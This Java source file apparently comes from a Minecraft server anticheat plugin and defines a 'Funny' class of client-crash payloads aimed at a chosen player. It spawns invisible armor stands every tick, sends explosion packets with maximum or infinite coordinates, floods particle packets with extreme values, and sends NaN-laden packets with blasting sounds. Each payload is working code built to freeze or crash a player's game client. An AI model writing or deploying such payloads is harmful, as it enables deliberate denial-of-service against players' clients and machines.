package com.elevatemc.anticheat.util.funny;

import com.elevatemc.anticheat.Hood;
import com.elevatemc.anticheat.util.math.MathUtil;
import lombok.AllArgsConstructor;
import lombok.Getter;
import net.minecraft.server.v1_8_R3.*;
import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.Sound;
import org.bukkit.craftbukkit.v1_8_R3.CraftWorld;
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;
import org.bukkit.scheduler.BukkitRunnable;

import java.util.Collections;
import java.util.concurrent.ThreadLocalRandom;
import java.util.function.Consumer;

public class Funny {

    public static void fpsKiller(Player player) {
        new BukkitRunnable() {
            @Override
            public void run() {
                if (player.isOnline()) {
                    int max = 60;
                    for (int i = 0; i < max; i++) {
                        dropFPS(player);
                    }

                    player.closeInventory();
                } else {
                    this.cancel();
                }
            }
        }.runTaskTimer(Hood.get(), 0L, 0L);
    }
    public static void dropFPS(Player target) {
        EntityArmorStand entityArmorStand = new EntityArmorStand(((CraftWorld) target.getWorld()).getHandle());
        entityArmorStand.setLocation(target.getLocation().getX(), target.getLocation().getY(),
                target.getLocation().getZ(), 0, 0);
        entityArmorStand.setGravity(false);
        entityArmorStand.setArms(true);
        entityArmorStand.setBasePlate(false);
        entityArmorStand.setInvisible(true);

        PacketPlayOutSpawnEntityLiving spawnEntity = new PacketPlayOutSpawnEntityLiving(entityArmorStand);
        ((CraftPlayer) target).getHandle().playerConnection.sendPacket(spawnEntity);
    }

    /**
     * @author Moose1301
     * @date 5/4/2024
     */
    @AllArgsConstructor
    @Getter
    public enum CrashType {
        LAGOUT("Lagout", Material.STRING, Funny::fpsKiller),
        BOMB("Bomb", Material.TNT, player -> {
            ((CraftPlayer) player).getHandle().playerConnection.sendPacket(new PacketPlayOutExplosion(
                    Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE,
                    Float.MAX_VALUE, Collections.EMPTY_LIST,
                    new Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)));

            ((CraftPlayer) player).getHandle().playerConnection.sendPacket(new PacketPlayOutExplosion(
                    Float.MAX_VALUE, Float.MAX_VALUE, Float.MAX_VALUE,
                    Float.MAX_VALUE, Collections.EMPTY_LIST,
                    new Vec3D(Float.MAX_VALUE, Float.MAX_VALUE, Float.MAX_VALUE)));
        }),
        PARTICLE("Particle", Material.FIREWORK_CHARGE, player -> {
            Location location = player.getLocation();

            Bukkit.getScheduler().runTaskAsynchronously(Hood.get(), () -> {

                int[] values = {Integer.MAX_VALUE, Integer.MIN_VALUE,
                        MathUtil.getRandomInteger(1000000, 9500000)};

                EnumParticle[] particles = {
                        EnumParticle.SMOKE_LARGE, EnumParticle.SPELL_MOB, EnumParticle.CRIT,
                        EnumParticle.CRIT_MAGIC, EnumParticle.FLAME,
                        EnumParticle.FOOTSTEP, EnumParticle.VILLAGER_HAPPY
                };

                for (int i = 0; i < 25; i++) {
                    for (int value : values) {

                        PacketPlayOutWorldParticles packet = new PacketPlayOutWorldParticles(
                                particles[ThreadLocalRandom.current().nextInt(particles.length)],
                                true, (float) location.getX(), (float) location.getY(),
                                (float) location.getZ(), value, value, value,
                                value, value, (int[]) null
                        );

                        for (int a = 0; a < 100; a++) {
                            ((CraftPlayer) player).getHandle().playerConnection.sendPacket(packet);
                        }
                    }
                }
            });
        }),

        SHIT("Secret", Material.CHAINMAIL_BOOTS, player -> {
            if (player != null) {
                new Thread(() -> {
                    if (!player.isOnline()) {
                        return;
                    }
                    ((CraftPlayer) player).getHandle().playerConnection.sendPacket(new PacketPlayOutGameStateChange(10, 0.0F));

                    for (int i = 0; i < 10; ++i) {
                        player.playSound(player.getLocation(), Sound.BAT_DEATH, 2.14748365E9F, 0.2F);
                        player.playSound(player.getLocation(), Sound.ANVIL_LAND, 2.14748365E9F, 0.2F);
                        player.playSound(player.getLocation(), Sound.ARROW_HIT, 2.14748365E9F, 0.2F);
                        player.playSound(player.getLocation(), Sound.AMBIENCE_THUNDER, 1.0F, 0.2F);
                    }
                    try {
                        Thread.sleep(2500);
                    } catch (InterruptedException e) {
                        throw new RuntimeException(e);
                    }

                    ((CraftPlayer) player).getHandle().playerConnection.sendPacket(
                            new PacketPlayOutExplosion(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY,
                                    Float.POSITIVE_INFINITY, Collections.EMPTY_LIST,
                                    new Vec3D(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY)));
                    ((CraftPlayer) player).getHandle().playerConnection.sendPacket(
                            new PacketPlayOutWorldParticles(EnumParticle.PORTAL, true,
                                    Float.NaN, Float.NaN, Float.NaN, Float.NaN, Float.NaN, Float.NaN, Float.NaN, Integer.MAX_VALUE));
                }).start();
            }
        });


        private final String name;
        private final Material icon;
        private final Consumer<Player> callback;


        public void apply(Player player) {
            callback.accept(player);
        }

    }
}
